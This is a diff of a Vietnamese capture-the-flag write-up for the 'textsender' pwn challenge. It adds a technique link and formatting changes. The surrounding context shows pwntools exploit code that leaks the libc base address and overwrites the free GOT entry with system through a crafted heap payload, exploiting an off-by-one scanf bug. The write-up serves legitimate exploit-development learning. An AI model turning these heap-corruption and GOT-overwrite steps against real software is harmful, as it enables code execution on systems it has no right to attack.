@@ -1,5 +1,7 @@
 # textsender
 
+https://github.com/wan-hyhty/Techniques#house-of-enherjar
+
 ## Bugs
 
 - Ta có bug off-by-one của hàm scanf khiến mình liên tưởng kĩ thuật poison null byte, tuy nhiên các chunk được malloc cố định là 0x20, 0x80 0x200 nên có vẻ không được
@@ -87,7 +89,9 @@ send()
   ![Alt text](/senkai//textsender/bin/image-5.png)
 
 ### Leak libc
+
 - Ta có thể điều khiển 2 con trỏ của chunk 0x20 để leak libc
+
 ```python
 fill_bin()
 add("wan",b"b")
@@ -100,7 +104,9 @@ p.recvuntil(b'6) ')
 libc.address = u64(p.recvuntil(b':', drop=True) + b'\0\0') - libc.sym.puts
 info(hex(libc.address))
 ```
+
 ### Ow free
+
 ```python
 edit(b'9')
 payload = b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(exe.got.free)
@@ -109,8 +115,11 @@ edit(p64(libc.address + 0x77ec0))
 sla(b': ', p64(libc.sym.system))
 send()
 ```
+
 ### Kết quả
+
 ![Alt text](/senkai//textsender/bin/image-6.png)
+
 ```python
 #!/usr/bin/python3
 
@@ -165,7 +174,7 @@ def edit(idx):
 def setname(payload):
     sla(b"> ", b"1")
     sla(b": ", payload)
-    
+
 def fill_bin():
     add("wan", b'bbbb')
     add("wan", b'bbbb')
@@ -175,7 +184,7 @@ def fill_bin():
     add("2", b'bbbb')
 fill_bin()
 setname(b'a')
-send()  
+send()
 
 fill_bin()
 add("wan",b"b")
